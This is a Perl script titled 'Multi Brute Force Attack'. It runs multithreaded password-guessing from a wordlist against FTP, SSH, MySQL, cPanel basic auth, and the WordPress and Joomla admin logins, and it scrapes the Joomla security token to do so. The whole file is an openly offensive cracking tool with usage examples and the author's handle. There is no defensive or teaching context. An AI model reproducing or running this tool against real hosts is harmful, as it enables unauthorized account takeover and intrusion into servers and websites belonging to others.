#!/usr/bin/env perl

# Multi Brute Force Attack recode by N1ght_


use strict;
use warnings;
use threads;
use Net::FTP;
use DBI;
use LWP;
use Net::OpenSSH;
use DBD::mysql;
use Getopt::Long;
use threads::shared;
use WWW::Mechanize;
use Term::ANSIColor qw(:constants);


sub banner {
    print '
    '.BRIGHT_GREEN.'[!]'.RESET.''.BRIGHT_YELLOW.' Multi Brute Force Attack '.RESET.''.BOLD RED.'( Recoded )'.RESET.'
    '.BRIGHT_GREEN.' |'.RESET.'
    '.BRIGHT_GREEN.' |---> '.RESET.''.BOLD BLUE.'By :'.RESET.''.BOLD RED.' N1ght.Hax0r'.RESET.'
    '.BRIGHT_GREEN.' |---> '.RESET.''.BOLD BLUE.'Contact :'.RESET.''.BOLD RED.' N1ghtpe0ple@protonmail.com'.RESET.'
    '.BRIGHT_GREEN.' |---> '.RESET.''.BOLD BLUE.'Facebook :'.RESET.''.BOLD RED.' Putra AR (id = N1ghtpe0ple)'.RESET.'
    '.BRIGHT_GREEN.' |---> '.RESET.''.BOLD BLUE.'Github :'.RESET.''.BOLD RED.' https://github.com/N1ght420'.RESET.'
    '.BRIGHT_GREEN.' |______________________________________________'.RESET.'


    '.BOLD BLUE.'[*]'.RESET.''.BRIGHT_YELLOW.' Options :'.RESET.'

        '.BRIGHT_GREEN.'-u'.RESET.' | '.BRIGHT_GREEN.'--user'.RESET.' => Username             '.BOLD RED.'['.RESET.''.BRIGHT_YELLOW.'example :'.RESET.' '.BOLD BLUE.'admin'.RESET.''.BOLD RED.']'.RESET.'
        '.BRIGHT_GREEN.'-h'.RESET.' | '.BRIGHT_GREEN.'--host'.RESET.' => Target               '.BOLD RED.'['.RESET.''.BRIGHT_YELLOW.'example :'.RESET.' '.BOLD BLUE.'127.0.0.1'.RESET.''.BOLD RED.']'.RESET.'
        '.BRIGHT_GREEN.'-w'.RESET.' | '.BRIGHT_GREEN.'--wordlist'.RESET.' => Wordlist         '.BOLD RED.'['.RESET.''.BRIGHT_YELLOW.'example :'.RESET.' '.BOLD BLUE.'/home/user/wordlist.txt'.RESET.''.BOLD RED.']'.RESET.'
        '.BRIGHT_GREEN.'-t'.RESET.' | '.BRIGHT_GREEN.'--threads'.RESET.' => Thread Number     '.BOLD RED.'['.RESET.''.BRIGHT_YELLOW.'example :'.RESET.' '.BOLD BLUE.'25'.RESET.''.BOLD RED.']'.RESET.'
        '.BRIGHT_GREEN.'-m'.RESET.' | '.BRIGHT_GREEN.'--module'.RESET.' => Module Name        '.BOLD RED.'['.RESET.''.BRIGHT_YELLOW.'example :'.RESET.' '.BOLD BLUE.'wordpress'.RESET.''.BOLD RED.']'.RESET.'

    '.BRIGHT_GREEN.'[+]'.RESET.''.BRIGHT_YELLOW.' Module Lists :'.RESET.'

        '.BOLD BLUE.'[*]'.RESET.' ftp
        '.BOLD BLUE.'[*]'.RESET.' wordpress
        '.BOLD BLUE.'[*]'.RESET.' joomla
        '.BOLD BLUE.'[*]'.RESET.' authbasic (cpanel module)
        '.BOLD BLUE.'[*]'.RESET.' mysql
        '.BOLD BLUE.'[*]'.RESET.' ssh


    '.BRIGHT_GREEN.'[+]'.RESET.''.BRIGHT_YELLOW.' Examples :'.RESET.'

    '.BOLD RED.'$'.RESET.' ./MultiBF.pl '.BRIGHT_GREEN.'-u'.RESET.' admin '.BRIGHT_GREEN.'-h'.RESET.' 127.0.0.1 '.BRIGHT_GREEN.'-w'.RESET.' wordlist.txt '.BRIGHT_GREEN.'-t'.RESET.' 75 '.BRIGHT_GREEN.'-m'.RESET.' ftp                       '.BRIGHT_YELLOW.'|->'.RESET.''.BOLD RED.' FTP'.RESET.'
    '.BOLD RED.'$'.RESET.' ./MultiBF.pl '.BRIGHT_GREEN.'-u'.RESET.' admin '.BRIGHT_GREEN.'-h'.RESET.' localhost/wp-login.php '.BRIGHT_GREEN.'-w'.RESET.' wordlist.txt '.BRIGHT_GREEN.'-t'.RESET.' 110 '.BRIGHT_GREEN.'-m'.RESET.' wordpress   '.BRIGHT_YELLOW.'|->'.RESET.''.BOLD RED.' WordPress'.RESET.'
    '.BOLD RED.'$'.RESET.' ./MultiBF.pl '.BRIGHT_GREEN.'-u'.RESET.' admin '.BRIGHT_GREEN.'-h'.RESET.' localhost/administrator/ '.BRIGHT_GREEN.'-w'.RESET.' wordlist.txt '.BRIGHT_GREEN.'-t'.RESET.' 110 '.BRIGHT_GREEN.'-m'.RESET.' joomla    '.BRIGHT_YELLOW.'|->'.RESET.''.BOLD RED.' Joomla'.RESET.'
    '.BOLD RED.'$'.RESET.' ./MultiBF.pl '.BRIGHT_GREEN.'-u'.RESET.' admin '.BRIGHT_GREEN.'-h'.RESET.' localhost:2082 '.BRIGHT_GREEN.'-w'.RESET.' wordlist.txt '.BRIGHT_GREEN.'-t'.RESET.' 110 '.BRIGHT_GREEN.'-m'.RESET.' authbasic           '.BRIGHT_YELLOW.'|->'.RESET.''.BOLD RED.' CPanel'.RESET.'
    '.BOLD RED.'$'.RESET.' ./MultiBF.pl '.BRIGHT_GREEN.'-u'.RESET.' admin '.BRIGHT_GREEN.'-h'.RESET.' localhost '.BRIGHT_GREEN.'-w'.RESET.' wordlist.txt '.BRIGHT_GREEN.'-t'.RESET.' 110 '.BRIGHT_GREEN.'-m'.RESET.' mysql                    '.BRIGHT_YELLOW.'|->'.RESET.''.BOLD RED.' MySQL'.RESET.'
    '.BOLD RED.'$'.RESET.' ./MultiBF.pl '.BRIGHT_GREEN.'-u'.RESET.' admin '.BRIGHT_GREEN.'-h'.RESET.' 127.0.0.1 '.BRIGHT_GREEN.'-w'.RESET.' wordlist.txt '.BRIGHT_GREEN.'-t'.RESET.' 25 '.BRIGHT_GREEN.'-m'.RESET.' ssh                       '.BRIGHT_YELLOW.'|->'.RESET.''.BOLD RED.' SSH'.RESET.'

';
    exit(1);
}

my($wordlist,$thr,$ini,$fin,@threads,$arq,$i,@a,$test);
our($user,$host,@aa,$type,$token);

GetOptions( 'u|user=s'  => \$user,
        'h|host=s' => \$host,
        'w|wordlist=s' => \$wordlist,
        'm|module=s' => \$type,
        't|threads=i' => \$thr
) || die &banner;

if(defined($type)){
    foreach('ftp','wordpress','joomla','authbasic','mysql','ssh'){
        if($type eq $_){
            $type = \&$type;
            $test = 1;
            last;
        }
    }

    if(!defined($test)){
        &banner;
    }

} else {
    &banner;
}

&banner if (!defined($user)) || (!defined($host)) || (!defined($wordlist)) || (!defined($thr));

open($arq,"<$wordlist") || die($!);
@a = <$arq>;
close($arq);
@aa = grep { !/^$/ } @a;

print "\n".BRIGHT_GREEN.'[+]'.RESET." Starting Attack...";
print "\n".BRIGHT_GREEN.'[+]'.RESET." Host => $host";
print "\n".BRIGHT_GREEN.'[+]'.RESET." User => $user";
print "\n".BRIGHT_GREEN.'[+]'.RESET." Wordlist => $wordlist";
print "\n".BRIGHT_GREEN.'[+]'.RESET." Threads => $thr\n\n";

my $stop :shared = 0;

$ini = 0;
$fin = $thr - 1;

while(1){

    @threads = ();

    #die("\n\n".BRIGHT_GREEN."[+]".RESET." 100% complete\n\n") if $stop;

    for($i=$ini;$i<=$fin;$i++){
        push(@threads,$i);
    }

    foreach(@threads){
        $_ = threads->create(\&brute);
    }

    foreach(@threads){
        $_->join();
    }

    print("\n\n".BRIGHT_GREEN."[+]".RESET." Complete\n\n") if $stop;
    exit(0) if $stop;

    for($i=$ini;$i<=$fin;$i++){
        #last if $stop;
        print BOLD RED.'[!]'.RESET." Trying => $aa[$i]";# if(defined($aa[$i]));
    }

    $ini = $fin + 1;
    $fin = $fin + $thr;

}

sub brute {

    my $id = threads->tid();
    threads->exit() if $stop;
    $id--;
    if(defined($aa[$id])){
        &$type($aa[$id]);
    } else {
        $stop = 1;
    }
}

sub ftp {
    my($pass) = @_;
    chomp($pass);

    my $f = Net::FTP->new($host) || die($!);

    if($f->login($user, $pass)){
        $f->quit;
        print "\n\n\t".BRIGHT_GREEN.'[*]'.RESET." Password Cracked: $pass\n";
        $stop = 1;
    } else {
        $f->quit;
        return;
    }
}

sub mysql {
    my($pass) = @_;
    chomp($pass);
    my $dsn = "dbi:mysql::$host:3306";
    my $DBIconnect = DBI->connect($dsn, $user, $pass,{
        PrintError => 0,
        RaiseError => 0
    });
    if(!$DBIconnect){
        return;
    } else {
        print "\n\n\t".BRIGHT_GREEN.'[*]'.RESET." Password Cracked: $pass\n";
        $stop = 1;
    }
}

sub authbasic {
    my($pass) = @_;
    chomp($pass);

    if($host !~ /^(http|https):\/\//){
        $host = 'http://'.$host;
    }
    my $ua = LWP::UserAgent->new;
    my $req = HTTP::Request->new(GET => $host);
    $req->authorization_basic($user, $_);
    if($ua->request($req)->code == 401){
        return;
    } else {
        print "\n\n\t".BRIGHT_GREEN.'[*]'.RESET." Password Cracked: $pass\n";
        $stop = 1;
    }
}

sub wordpress {
    my($pass) = @_;
    chomp($pass);

    my $ua = new LWP::UserAgent;
    if ($host !~ /^(http|https):\/\//){
        $host = 'http://' . $host;
    }

        my $response = $ua->post($host,{
            'log' => $user,
            'pwd' => $pass,
            'wp-submit' => 'Log in',
    });
    my $code = $response->code;
    if($code =~ /302/){
        print "\n\n\t".BRIGHT_GREEN.'[*]'.RESET." Password Cracked: $pass\n";
        $stop = 1;
    } else {
        return;
    }
}

sub joomla {
    my($pass) = @_;
    chomp($pass);

    if ($host !~ /^(http|https):\/\//){
        $host = 'http://' . $host;
    }

    my $mech = WWW::Mechanize->new();
    $mech->get($host);
    if($mech->content() =~ /([0-9a-fA-F]{32})/){
        $token = $1;
    } else {
        die("\n[!] Error to get security token\n");
    }

    $mech->submit_form(
        fields => {
            username => $user,
            passwd  => $pass,
            task  => 'login',
            $token  => '1',
        }
    );

    if($mech->content() !~ /com_categories/i){
        return;
    } else {
        print "\n\n\t".BRIGHT_GREEN.'[*]'.RESET." Password Cracked: $pass\n";
        $stop = 1;
    }
}

sub ssh {
    my($pass) = @_;
    chomp($pass);

    open(my $stderr_fh,'>>/dev/null') || die $!;
    open(my $stdout_fh,'>>/dev/null') || die $!;

    my %opts = (
        user => $user,
        passwd => $pass,
        default_stderr_fh => $stderr_fh,
        default_stdout_fh => $stdout_fh,
        timeout => 20,
    );

    my $ssh = Net::OpenSSH->new($host,%opts);

    if($ssh->error){
        return;
    } else {
        print "\n\n\t".BRIGHT_GREEN.'[*]'.RESET." Password Cracked: $pass\n";
        $stop = 1;
    }
}
